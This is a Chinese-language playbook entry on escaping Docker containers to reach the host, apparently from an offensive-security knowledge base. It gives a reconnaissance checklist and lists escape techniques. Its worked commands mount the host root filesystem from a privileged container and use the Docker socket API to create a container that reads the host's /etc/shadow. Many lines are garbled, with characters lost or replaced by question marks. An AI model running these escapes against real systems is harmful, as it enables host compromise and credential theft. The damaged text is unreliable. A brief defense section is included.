# Docker Container Escape Techniques

**ID**: `container-docker-escape-001` | **分类**: container | **风险等级**: critical

Docker 容器逃逸技术用于在获取容器访问权限后，突破容器隔离限制访问宿主机资源。容器安全依?Linux namespace ?cgroup 隔离机制，但不当配置或内核漏洞可被利用实现逃逸

## 触发场景

- 成功获取容器 shell 后需要逃逸到宿主
- 容器以特权模?(--privileged) 运行
- 容器挂载了宿主机敏感目录
- 容器使用了不安全?Capability 配置
- Docker socket 被挂载到容器?

## 操作检查清单

1. 检查容器是否以特权模式运行 (cat /proc/1/status | grep Cap)
2. 检?Docker socket 是否存在 (/var/run/docker.sock)
3. 检查挂载的宿主机目?(mount, df -h)
4. 检查容?Capability 配置 (capsh --print)
5. 检查内核版本和 Docker 版本
6. 检?cgroup 配置
7. 根据配置选择合适的逃逸技?

## 技术手段

- 特权模式逃逸：挂载宿主机根文件系统
- Docker socket 逃逸：通过 API 创建特权容器
- cgroup release_agent 逃
- CVE-2019-5736 runc 逃
- 危险 Capability 利用 (SYS_MODULE 加载内核模块)
- procfs 逃?(通过 /proc 访问宿主机进?

## 症状

- 容器内发?docker.sock 文件
- 容器?--privileged 模式运行
- 敏感目录被挂载到容器
- 容器具有危险 Capability (SYS_ADMIN, SYS_PTRACE ?

## 根因分析

- 特权模式 (--privileged) 授予所?Linux Capability
- Docker socket 挂载使容器可控制宿主?Docker daemon
- 危险 Capability 配置不当
- 宿主机内核存在容器逃逸相关漏?(CVE-2019-5736 ?
- 不安全的 cgroup 配置允许 release_agent 利用

## 示例

### 特权模式挂载逃

利用 --privileged 容器的设备访问权限挂载宿主机根文件系

```
# 在特权容器内
mkdir -p /tmp/host
mount /dev/sda1 /tmp/host
# 或者挂载宿主机根目录
fdisk -l  # 查找宿主机根分区
mount /dev/vda1 /tmp/host
chroot /tmp/host  # 进入宿主机环?
```

### Docker Socket 逃

通过 docker.sock 创建特权容器访问宿主

```
# 在容器内通过 docker socket 创建新容器
curl --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["cat","/host/etc/shadow"],
       "HostConfig":{"Binds":["/:/host:ro","/var/run/docker.sock:/var/run/docker.sock"]}}'
# 启动容器获取宿主机文?
```

## 成功标志

- mount 操作成功
- chroot 进入宿主机环
- 通过 docker API 创建新容?

## 防御建议

- 禁止使用 --privileged 模式
- 不要挂载 Docker socket 到容
- 使用最小必?Capability 配置
- 实施 Seccomp ?AppArmor 策略
- 使用?root 用户运行容器
- 限制挂载点范?
